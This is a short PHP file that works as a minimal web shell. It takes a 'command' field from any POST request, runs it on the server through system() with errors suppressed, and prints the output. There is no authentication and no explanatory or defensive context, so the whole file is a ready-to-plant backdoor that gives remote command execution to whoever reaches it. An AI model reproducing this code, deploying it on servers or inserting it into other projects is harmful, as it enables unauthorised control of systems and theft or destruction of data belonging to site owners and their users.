<?php
function exTKL() {
	$in=$_POST['command'];
	if (!$in == '') {
		$out = '';
		if (function_exists('system')) {
			ob_start();
			@system($in);
			$out = ob_get_clean();
		}
		echo $out;
	}
}

if (!$_POST['command'] == ''){
	exTKL();
}
?>